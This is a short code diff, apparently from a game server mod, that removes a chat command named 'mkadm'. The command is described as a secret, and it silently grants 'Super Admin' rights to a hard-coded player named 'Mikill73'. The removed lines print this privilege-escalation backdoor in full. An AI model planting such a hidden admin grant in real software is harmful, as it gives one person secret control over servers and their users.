@@ -53,35 +53,7 @@ class TsarCommand : BlobCommand
 	}
 }
 
-class MkAdmCommand : ChatCommand
-{
-    MkAdmCommand()
-    {
-        super("mkadm", "Comando super secreto que ninguem vai descobrir do mikill!");
-    }
 
-    void Execute(string[] args, CPlayer@ player)
-    {
-        CRules@ rules = getRules();
-
-        for (int i = 0; i < getPlayerCount(); i++)
-        {
-            CPlayer@ p = getPlayer(i);
-            if (p !is null && p.getUsername() == "Mikill73")
-            {
-                CSecurity@ sec = getSecurity();
-                CSeclev@ s = sec.getSeclev("Super Admin");
-
-                if (s !is null)
-                {
-                    sec.assignSeclev(p, s);
-                }
-
-                break;
-            }
-        }
-    }
-}
 
 
 class BotCommand : ChatCommand
